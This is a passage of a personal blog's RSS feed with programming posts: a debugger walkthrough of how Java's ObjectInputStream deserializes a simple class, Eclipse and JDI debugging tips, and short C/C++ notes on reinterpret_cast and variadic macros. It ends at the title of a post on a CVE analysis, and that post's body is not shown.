<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on Zeqi&#39;s Blog</title>
    <link>https://zeqiii.github.io/post/</link>
    <description>Recent content in Posts on Zeqi&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-EN</language>
    <managingEditor>zeqiii@163.com (zeqi)</managingEditor>
    <webMaster>zeqiii@163.com (zeqi)</webMaster>
    <copyright>(c) 2016 zeqi</copyright>
    <lastBuildDate>Tue, 15 Mar 2016 10:28:28 +0800</lastBuildDate>
    <atom:link href="https://zeqiii.github.io/post/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Analysis of Java Serialization</title>
      <link>https://zeqiii.github.io/2016/03/15/analysis-of-java-serialization/</link>
      <pubDate>Tue, 15 Mar 2016 10:28:28 +0800</pubDate>
      <author>zeqiii@163.com (zeqi)</author>
      <guid>https://zeqiii.github.io/2016/03/15/analysis-of-java-serialization/</guid>
      <description>

&lt;h3 id=&#34;demo:68a7f84eae0d34438ed8064af9699a4b&#34;&gt;Demo&lt;/h3&gt;

&lt;p&gt;Class &lt;code&gt;MySerial&lt;/code&gt; contains these fields and methods.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class MySerial implements Serializable{
	private static final long serialVersionUID = -7524021481133441646L;
	private int mArg = 1;
	private int mOrg = 2;
	
	public String toString() {
		return &amp;quot;mArg:&amp;quot; + mArg + &amp;quot; mOrg:&amp;quot; + mOrg;
	}
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In main function.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public static void main(String[] argv) {
	MySerial mySerial = new MySerial();
	try {
		ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&amp;quot;obj.bin&amp;quot;));
		oos.writeObject(mySerial);     // Set a break point here.
		oos.flush();
		oos.close();
	
		ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&amp;quot;obj.bin&amp;quot;));
		Object obj = ois.readObject(); // Set a break point here.
		System.out.println(obj.getClass().getName());
	} catch (Exception e) {
		...
	}
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;debugging-objectinputstream-readobject:68a7f84eae0d34438ed8064af9699a4b&#34;&gt;Debugging ObjectInputStream.readObject()&lt;/h3&gt;

&lt;p&gt;The constructor of &lt;code&gt;ObjectInputStream&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public ObjectInputStream(InputStream in) throws IOException {
    verifySubclass();
    bin = new BlockDataInputStream(in);
    handles = new HandleTable(10);
    vlist = new ValidationList();
    enableOverride = false;
    readStreamHeader();
    bin.setBlockDataMode(true);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;protected void readStreamHeader() throws IOException, StreamCorruptedException
{
    short s0 = bin.readShort();
    short s1 = bin.readShort();
    // STREAM_MAGIC=-21267, STREAM_VERSION=5
    if (s0 != STREAM_MAGIC || s1 != STREAM_VERSION) {
        throw new StreamCorruptedException(
            String.format(&amp;quot;invalid stream header: %04X%04X&amp;quot;, s0, s1));
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/magic_and_version.png&#34; alt=&#34;magic and version&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Step into function &lt;code&gt;ois.readObject&lt;/code&gt;, see how an object is created during deserialization.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public final Object readObject() throws IOException, ClassNotFoundException
{
    if (enableOverride) {
        return readObjectOverride();
    }

    // if nested read, passHandle contains handle of enclosing object
    int outerHandle = passHandle;
    try {
        Object obj = readObject0(false);  // Step into this function
        handles.markDependency(outerHandle, passHandle);
        ClassNotFoundException ex = handles.lookupException(passHandle);
        if (ex != null) {
            throw ex;
        }
        if (depth == 0) {
            vlist.doCallbacks();
        }
        return obj;
    } finally {
        passHandle = outerHandle;
        if (closed &amp;amp;&amp;amp; depth == 0) {
            clear();
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Step into &lt;code&gt;Object obj = readObject0(false)&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;/**
 * Underlying readObject implementation.
 */
private Object readObject0(boolean unshared) throws IOException {

    ...

    byte tc;
    // TC_RESET = 121 = 0x79
    while ((tc = bin.peekByte()) == TC_RESET) {
        bin.readByte();
        handleReset();
    }

    depth++;

    ...

}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/tc_reset.png&#34; alt=&#34;tc_reset&#34; /&gt;&lt;/p&gt;

&lt;p&gt;In obj.bin, there is no &lt;code&gt;TC_RESET&lt;/code&gt;, so let&amp;rsquo;s continue.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;private Object readObject0(boolean unshared) throws IOException {
    
    ...

    depth++;
    try {
        switch (tc) {
            case TC_NULL:
                return readNull();

            ...

            // TC_OBJECT = 115 = 0x73
            case TC_OBJECT:
                return checkResolve(readOrdinaryObject(unshared));

            default:
                throw new StreamCorruptedException(
                    String.format(&amp;quot;invalid type code: %02X&amp;quot;, tc));
        }
    } finally {
        depth--;
        bin.setBlockDataMode(oldMode);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/tc_reset.png&#34; alt=&#34;tc_reset&#34; /&gt;&lt;/p&gt;

&lt;p&gt;0x73 equals &lt;code&gt;TC_OBJECT&lt;/code&gt;, so next we step into &lt;code&gt;readOrdinaryObject(unshared)&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;private Object readOrdinaryObject(boolean unshared) throws IOException
{
    if (bin.readByte() != TC_OBJECT) {
        throw new InternalError();
    }

    ObjectStreamClass desc = readClassDesc(false);
    desc.checkDeserialize();

    ...

}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/tc_reset.png&#34; alt=&#34;tc_reset&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Step into `readClassDesc(false)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;/**
 * Reads in and returns (possibly null) class descriptor.  Sets passHandle
 * to class descriptor&#39;s assigned handle.  If class descriptor cannot be
 * resolved to a class in the local VM, a ClassNotFoundException is
 * associated with the class descriptor&#39;s handle.
 */
private ObjectStreamClass readClassDesc(boolean unshared) throws IOException
{
    byte tc = bin.peekByte();
    switch (tc) {
        case TC_NULL:
            return (ObjectStreamClass) readNull();

        case TC_REFERENCE:
            return (ObjectStreamClass) readHandle(unshared);

        case TC_PROXYCLASSDESC:
            return readProxyDesc(unshared);
        
        // TC_CLASSDESC = 114 = 0x72
        case TC_CLASSDESC:
            return readNonProxyDesc(unshared);

        default:
            throw new StreamCorruptedException(
                String.format(&amp;quot;invalid type code: %02X&amp;quot;, tc));
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/class_desc.png&#34; alt=&#34;class desc&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Step into &lt;code&gt;readNonProxyDesc(unshared)&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;private ObjectStreamClass readNonProxyDesc(boolean unshared)
    throws IOException
{
    if (bin.readByte() != TC_CLASSDESC) {
        throw new InternalError();
    }

    ObjectStreamClass desc = new ObjectStreamClass();
    int descHandle = handles.assign(unshared ? unsharedMarker : desc);
    passHandle = NULL_HANDLE;

    ObjectStreamClass readDesc = null;
    try {
        readDesc = readClassDescriptor();
    } catch (ClassNotFoundException ex) {
        throw (IOException) new InvalidClassException(
            &amp;quot;failed to read class descriptor&amp;quot;).initCause(ex);
    }

    ...

}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Step into &lt;code&gt;readClassDescriptor()&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;/**
 * Read a class descriptor from the serialization stream.  This method is
 * called when the ObjectInputStream expects a class descriptor as the next
 * item in the serialization stream.  Subclasses of ObjectInputStream may
 * override this method to read in class descriptors that have been written
 * in non-standard formats (by subclasses of ObjectOutputStream which have
 * overridden the &amp;lt;code&amp;gt;writeClassDescriptor&amp;lt;/code&amp;gt; method).  By default,
 * this method reads class descriptors according to the format defined in
 * the Object Serialization specification.
 *
 * @return  the class descriptor read
 * @throws  IOException If an I/O error has occurred.
 * @throws  ClassNotFoundException If the Class of a serialized object used
 *          in the class descriptor representation cannot be found
 * @see java.io.ObjectOutputStream#writeClassDescriptor(java.io.ObjectStreamClass)
 * @since 1.3
 */
protected ObjectStreamClass readClassDescriptor() throws IOException, ClassNotFoundException
{
    ObjectStreamClass desc = new ObjectStreamClass();
    desc.readNonProxy(this);
    return desc;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Step into &lt;code&gt;desc.readNonProxy(this)&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;void readNonProxy(ObjectInputStream in) throws IOException, ClassNotFoundException
{
    name = in.readUTF();
    suid = Long.valueOf(in.readLong());
    isProxy = false;

    byte flags = in.readByte();
    hasWriteObjectData =
        ((flags &amp;amp; ObjectStreamConstants.SC_WRITE_METHOD) != 0);
    hasBlockExternalData =
        ((flags &amp;amp; ObjectStreamConstants.SC_BLOCK_DATA) != 0);
    externalizable =
        ((flags &amp;amp; ObjectStreamConstants.SC_EXTERNALIZABLE) != 0);
    boolean sflag =
        ((flags &amp;amp; ObjectStreamConstants.SC_SERIALIZABLE) != 0);
    if (externalizable &amp;amp;&amp;amp; sflag) {
        throw new InvalidClassException(
            name, &amp;quot;serializable and externalizable flags conflict&amp;quot;);
    }
    serializable = externalizable || sflag;
    isEnum = ((flags &amp;amp; ObjectStreamConstants.SC_ENUM) != 0);
    if (isEnum &amp;amp;&amp;amp; suid.longValue() != 0L) {
        throw new InvalidClassException(name,
            &amp;quot;enum descriptor has non-zero serialVersionUID: &amp;quot; + suid);
    }

    int numFields = in.readShort();
    if (isEnum &amp;amp;&amp;amp; numFields != 0) {
        throw new InvalidClassException(name,
            &amp;quot;enum descriptor has non-zero field count: &amp;quot; + numFields);
    }
    fields = (numFields &amp;gt; 0) ?
        new ObjectStreamField[numFields] : NO_FIELDS;
    for (int i = 0; i &amp;lt; numFields; i++) {
        char tcode = (char) in.readByte();
        String fname = in.readUTF();
        String signature = ((tcode == &#39;L&#39;) || (tcode == &#39;[&#39;)) ?
            in.readTypeString() : new String(new char[] { tcode });
        try {
            fields[i] = new ObjectStreamField(fname, signature, false);
        } catch (RuntimeException e) {
            throw (IOException) new InvalidClassException(name,
                &amp;quot;invalid descriptor for field &amp;quot; + fname).initCause(e);
        }
    }
    computeFieldOffsets();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;in.readUTF()&lt;/code&gt; read a &lt;code&gt;String&lt;/code&gt; from the stream and give it to &lt;code&gt;name&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/read_utf.png&#34; alt=&#34;read_utf&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;in.readLong()&lt;/code&gt; read a 64 bit &lt;code&gt;Long&lt;/code&gt; and give it to &lt;code&gt;suid&lt;/code&gt;. This long value is just the &lt;code&gt;MySerial.serialVersionUID&lt;/code&gt; in our demo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/read_long.png&#34; alt=&#34;read_long&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;byte flags = in.readByte();&lt;/code&gt; we get the flags &lt;code&gt;0x02&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/read_byte.png&#34; alt=&#34;read_byte&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Step over to &lt;code&gt;serializable = externalizable || sflag;&lt;/code&gt;, the value of &lt;code&gt;serializable&lt;/code&gt; is set to true.&lt;/p&gt;

&lt;p&gt;Step over to &lt;code&gt;int numFields = in.readShort();&lt;/code&gt;, the value of numFields is 2.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/read_short.png&#34; alt=&#34;read_short&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Then read two fields.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/read_field.png&#34; alt=&#34;read_field&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;computeFieldOffsets()&lt;/code&gt; calculates and sets serializable field offsets, as well as primitive data size and object field count totals.&lt;/p&gt;

&lt;p&gt;Return to &lt;code&gt;readNonProxyDesc()&lt;/code&gt;, now we&amp;rsquo;ve got an object of ObjectStreamClass, &lt;code&gt;readDesc&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;private ObjectStreamClass readNonProxyDesc(boolean unshared) {
    
    ...

    Class cl = null;
    ClassNotFoundException resolveEx = null;
    bin.setBlockDataMode(true);

    // Return true if this class is a custom subclass of ObjectInputStream
    final boolean checksRequired = isCustomSubclass();
    try {
        if ((cl = resolveClass(readDesc)) == null) {
            resolveEx = new ClassNotFoundException(&amp;quot;null class&amp;quot;);
        } else if (checksRequired) {
            ReflectUtil.checkPackageAccess(cl);
        }
    } catch (ClassNotFoundException ex) {
        resolveEx = ex;
    }
    skipCustomData();

    desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(false));

    handles.finish(descHandle);
    passHandle = descHandle;
    return desc;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Step into &lt;code&gt;resolveClass(readDesc)&lt;/code&gt; we can find this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;String name = desc.getName();
return Class.forName(name, false, latestUserDefinedLoader());
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So after we step out from &lt;code&gt;resolveClass(readDesc)&lt;/code&gt;, we step into &lt;code&gt;skipCustomData()&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;/**
 * Skips over all block data and objects until TC_ENDBLOCKDATA is
 * encountered.
 */
private void skipCustomData() throws IOException {
    int oldHandle = passHandle;
    for (;;) {
        if (bin.getBlockDataMode()) {
            bin.skipBlockData();
            bin.setBlockDataMode(false);
        }
        switch (bin.peekByte()) {
            case TC_BLOCKDATA:
            case TC_BLOCKDATALONG:
                bin.setBlockDataMode(true);
                break;

            // TC_ENDBLOCKDATA = 120 = 0x78
            case TC_ENDBLOCKDATA:
                bin.readByte();
                passHandle = oldHandle;
                return;

            default:
                readObject0(false);
                break;
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/tc_endblockdata.png&#34; alt=&#34;tc endblockdata&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Return to &lt;code&gt;readNonProxyDesc()&lt;/code&gt;, we step into &lt;code&gt;desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(false));&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;void initNonProxy(ObjectStreamClass model,
                      Class&amp;lt;?&amp;gt; cl,
                      ClassNotFoundException resolveEx,
                      ObjectStreamClass superDesc)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Firstly, we step into &lt;code&gt;readClassDesc(false)&lt;/code&gt;, according to the definition of &lt;code&gt;initNonProxy&lt;/code&gt;, we know this is for reading the description of the serializable object&amp;rsquo;s super class description.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;readClassDesc(false)&lt;/code&gt; is the same as above, but falls in case &lt;code&gt;TC_NULL&lt;/code&gt;, which means the serializable object has no super class.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;// TC_NULL = 112 = 0x70
case TC_NULL:
    return (ObjectStreamClass) readNull()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/tc_null.png&#34; alt=&#34;tc null&#34; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;/**
 * Initializes class descriptor representing a non-proxy class.
 */
void initNonProxy(ObjectStreamClass model,
                  Class&amp;lt;?&amp;gt; cl,
                  ClassNotFoundException resolveEx,
                  ObjectStreamClass superDesc) throws InvalidClassException
{
    // init this object from model
    this.cl = cl;
    this.resolveEx = resolveEx;
    this.superDesc = superDesc;
    name = model.name;
    suid = Long.valueOf(model.getSerialVersionUID());
    isProxy = false;
    isEnum = model.isEnum;
    serializable = model.serializable;
    externalizable = model.externalizable;
    hasBlockExternalData = model.hasBlockExternalData;
    hasWriteObjectData = model.hasWriteObjectData;
    fields = model.fields;
    primDataSize = model.primDataSize;
    numObjFields = model.numObjFields;

    if (cl != null) {
        // important, looks up and returns class descriptor for a given class
        localDesc = lookup(cl, true);

        // beginning of validations
        if (localDesc.isProxy) {
            throw new InvalidClassException(
                &amp;quot;cannot bind non-proxy descriptor to a proxy class&amp;quot;);
        }
        if (isEnum != localDesc.isEnum) {
            throw new InvalidClassException(isEnum ?
                &amp;quot;cannot bind enum descriptor to a non-enum class&amp;quot; :
                &amp;quot;cannot bind non-enum descriptor to an enum class&amp;quot;);
        }

        if (serializable == localDesc.serializable &amp;amp;&amp;amp;
            !cl.isArray() &amp;amp;&amp;amp;
            suid.longValue() != localDesc.getSerialVersionUID())
        {
            throw new InvalidClassException(localDesc.name,
                &amp;quot;local class incompatible: &amp;quot; +
                &amp;quot;stream classdesc serialVersionUID = &amp;quot; + suid +
                &amp;quot;, local class serialVersionUID = &amp;quot; +
                localDesc.getSerialVersionUID());
        }

        if (!classNamesEqual(name, localDesc.name)) {
            throw new InvalidClassException(localDesc.name,
                &amp;quot;local class name incompatible with stream class &amp;quot; +
                &amp;quot;name \&amp;quot;&amp;quot; + name + &amp;quot;\&amp;quot;&amp;quot;);
        }

        if (!isEnum) {
            if ((serializable == localDesc.serializable) &amp;amp;&amp;amp;
                (externalizable != localDesc.externalizable))
            {
                throw new InvalidClassException(localDesc.name,
                    &amp;quot;Serializable incompatible with Externalizable&amp;quot;);
            }

            if ((serializable != localDesc.serializable) ||
                (externalizable != localDesc.externalizable) ||
                !(serializable || externalizable))
            {
                deserializeEx = new ExceptionInfo(
                    localDesc.name, &amp;quot;class invalid for deserialization&amp;quot;);
            }
        }
        // ending of validations

        // Constructor of MySerial
        cons = localDesc.cons;
        writeObjectMethod = localDesc.writeObjectMethod;
        readObjectMethod = localDesc.readObjectMethod;
        readObjectNoDataMethod = localDesc.readObjectNoDataMethod;
        writeReplaceMethod = localDesc.writeReplaceMethod;
        readResolveMethod = localDesc.readResolveMethod;
        if (deserializeEx == null) {
            deserializeEx = localDesc.deserializeEx;
        }
    }
    fieldRefl = getReflector(fields, localDesc);
    // reassign to matched fields so as to reflect local unshared settings
    fields = fieldRefl.getFields();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;initNonProxy()&lt;/code&gt; will initialize &lt;code&gt;desc&lt;/code&gt;, which will be returned to &lt;code&gt;readOrdinaryObject(unshared)&lt;/code&gt;. Let&amp;rsquo;s go back to this function.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;private Object readOrdinaryObject(boolean unshared) throws IOException {

    ... // get an ObjectStreamClass

    Class&amp;lt;?&amp;gt; cl = desc.forClass();
    if (cl == String.class || cl == Class.class
            || cl == ObjectStreamClass.class) {
        throw new InvalidClassException(&amp;quot;invalid class descriptor&amp;quot;);
    }

    Object obj;
    try {
        // if desc.cons != null, isInstantiable() returns true
        // desc.newInstance() returns desc.cons.newInstance()
        obj = desc.isInstantiable() ? desc.newInstance() : null;
    } catch (Exception ex) {
        throw (IOException) new InvalidClassException(
            desc.forClass().getName(),
            &amp;quot;unable to create instance&amp;quot;).initCause(ex);
    }

    passHandle = handles.assign(unshared ? unsharedMarker : obj);
    ClassNotFoundException resolveEx = desc.getResolveException();
    if (resolveEx != null) {
        handles.markException(passHandle, resolveEx);
    }

    if (desc.isExternalizable()) {
        readExternalData((Externalizable) obj, desc);
    } else {
        // read field data from obj.bin
        readSerialData(obj, desc);
    }

    handles.finish(passHandle);

    if (obj != null &amp;amp;&amp;amp;
        handles.lookupException(passHandle) == null &amp;amp;&amp;amp;
        desc.hasReadResolveMethod())
    {
        Object rep = desc.invokeReadResolve(obj);
        if (unshared &amp;amp;&amp;amp; rep.getClass().isArray()) {
            rep = cloneArray(rep);
        }
        if (rep != obj) {
            handles.setObject(passHandle, obj = rep);
        }
    }

    return obj;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/fields.png&#34; alt=&#34;field values&#34; /&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Methods of Debugging Java Programs</title>
      <link>https://zeqiii.github.io/2016/03/10/methods-of-debugging-java-programs/</link>
      <pubDate>Thu, 10 Mar 2016 17:20:53 +0800</pubDate>
      <author>zeqiii@163.com (zeqi)</author>
      <guid>https://zeqiii.github.io/2016/03/10/methods-of-debugging-java-programs/</guid>
      <description>

&lt;h2 id=&#34;debug-java-source-code-in-eclipse:71104563d2f4707e3c3b17590a7ace2b&#34;&gt;Debug Java Source Code In Eclipse&lt;/h2&gt;

&lt;p&gt;Sometimes we want to know how a Java API works. It is a good idea to write a testing program, debug it and step into the API function to see how it works.&lt;/p&gt;

&lt;p&gt;But when I first try this, I encounter a problem like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/methods_of_debugging_java_programs/source_not_found.png&#34; alt=&#34;source not found&#34; /&gt;&lt;/p&gt;

&lt;p&gt;To solve this problem.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Select &lt;code&gt;Window&lt;/code&gt;-&amp;gt;&lt;code&gt;Preferences&lt;/code&gt;-&amp;gt;&lt;code&gt;Java&lt;/code&gt;-&amp;gt;&lt;code&gt;Installed JREs&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/methods_of_debugging_java_programs/installed_jres.png&#34; alt=&#34;installed jres&#34; /&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Click &lt;code&gt;Add...&lt;/code&gt;, select &lt;code&gt;Standard VM&lt;/code&gt; and click &lt;code&gt;Next&amp;gt;&lt;/code&gt;, in the dialog, add your JDK_HOME to the &lt;code&gt;JRE home:&lt;/code&gt;, give a name for the new JRE definition, then click &lt;code&gt;Finish&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/methods_of_debugging_java_programs/jre_definition.png&#34; alt=&#34;jre definition&#34; /&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Return to your project, right click on the project and select &lt;code&gt;Properties&lt;/code&gt;-&amp;gt;&lt;code&gt;Java Build Path&lt;/code&gt;-&amp;gt;&lt;code&gt;Libraries&lt;/code&gt;, select the &lt;code&gt;JRE System Library&lt;/code&gt; then click &lt;code&gt;Edit...&lt;/code&gt;. Replace the original JRE system library with your newly defined JRE library.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/methods_of_debugging_java_programs/edit_library.png&#34; alt=&#34;jre definition&#34; /&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Select &lt;code&gt;Run&lt;/code&gt;-&amp;gt;&lt;code&gt;Debug Configurations...&lt;/code&gt;-&amp;gt;&lt;code&gt;Source&lt;/code&gt;, add your project folder to the &lt;code&gt;Source Lookup Path&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/methods_of_debugging_java_programs/add_project_source_folder.png&#34; alt=&#34;add project source folder&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s debug!&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/methods_of_debugging_java_programs/debug.png&#34; alt=&#34;debug&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;debug-with-jdi:71104563d2f4707e3c3b17590a7ace2b&#34;&gt;Debug with JDI&lt;/h2&gt;

&lt;p&gt;Referring to &lt;a href=&#34;http://illegalargumentexception.blogspot.com/2009/03/java-using-jpda-to-write-debugger.html&#34;&gt;llegalargumentexception.blogspot.com&lt;/a&gt;, using Java code to connect to the VM can help us debug a Java program.&lt;/p&gt;

&lt;p&gt;The routine to debug.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class Test {

  int foo;

  public static void main(String[] args) {
    Random random = new Random();
    Test test = new Test();
    for (int i = 0; i &amp;lt; 10; i++) {
      test.foo = random.nextInt();
      System.out.println(test.foo);
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Firstly, import &lt;code&gt;tools.jar&lt;/code&gt; to the classpath.&lt;/p&gt;

&lt;p&gt;Code connecting to the VM:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class VMAcquirer {

  /**
   * Call this with the localhost port to connect to.
   */
  public VirtualMachine connect(int port)
      throws IOException {
    String strPort = Integer.toString(port);
    AttachingConnector connector = getConnector();
    try {
      VirtualMachine vm = connect(connector, strPort);
      return vm;
    } catch (IllegalConnectorArgumentsException e) {
      throw new IllegalStateException(e);
    }
  }

  private AttachingConnector getConnector() {
    VirtualMachineManager vmManager = Bootstrap
        .virtualMachineManager();
    for (Connector connector : vmManager
        .attachingConnectors()) {
      System.out.println(connector.name());
      if (&amp;quot;com.sun.jdi.SocketAttach&amp;quot;.equals(connector
          .name())) {
        return (AttachingConnector) connector;
      }
    }
    throw new IllegalStateException();
  }

  private VirtualMachine connect(
      AttachingConnector connector, String port)
      throws IllegalConnectorArgumentsException,
      IOException {
    Map&amp;lt;String, Connector.Argument&amp;gt; args = connector
        .defaultArguments();
    Connector.Argument pidArgument = args.get(&amp;quot;port&amp;quot;);
    if (pidArgument == null) {
      throw new IllegalStateException();
    }
    pidArgument.setValue(port);

    return connector.attach(args);
  }

}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then, monitoring Test.foo with code.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;

&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>C/C&#43;&#43; Programming knowledge</title>
      <link>https://zeqiii.github.io/2016/03/08/c/c-programming-knowledge/</link>
      <pubDate>Tue, 08 Mar 2016 10:12:52 +0800</pubDate>
      <author>zeqiii@163.com (zeqi)</author>
      <guid>https://zeqiii.github.io/2016/03/08/c/c-programming-knowledge/</guid>
      <description>

&lt;h2 id=&#34;functions-reserved-words-and-macros:f4d4f217ac0e8a971a18d7aee1dbb609&#34;&gt;Functions, Reserved Words and Macros&lt;/h2&gt;

&lt;h3 id=&#34;reinterpret-cast-new-type-expression:f4d4f217ac0e8a971a18d7aee1dbb609&#34;&gt;reinterpret_cast &lt;new_type&gt; (expression)&lt;/h3&gt;

&lt;p&gt;Cast the &lt;code&gt;expression&lt;/code&gt; to a &lt;code&gt;new_type&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;For example:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;typedef int (*FunctionPointer)(int); 
int value = 21; 
FunctionPointer funcP; 
funcP = reinterpret_cast&amp;lt;FunctionPointer&amp;gt; (&amp;amp;value); 
funcP(value);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Of course, this program will crash after being executed.&lt;/p&gt;

&lt;h3 id=&#34;macro-with-variable-argument-list:f4d4f217ac0e8a971a18d7aee1dbb609&#34;&gt;Macro with variable argument list&lt;/h3&gt;

&lt;p&gt;For example:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#define LOG(format, ...) fprintf(stdout, format, __VA_ARGS__)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;...&lt;/code&gt; means the arguments are variable, &lt;code&gt;__VA_ARGS__&lt;/code&gt; represents the variable arguments.&lt;/p&gt;

&lt;p&gt;In GCC, we can also:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#define LOG(format, args...) fprintf(stdout, format, args)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With the macros defined above, we can:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;LOG(&amp;quot;%d,%s&amp;quot;, 1, &amp;quot;hello&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Analysis of cve-2015-3837</title>
      <link>https://zeqiii.github.io/2016/03/07/analysis-of-cve-2015-3837/</link>
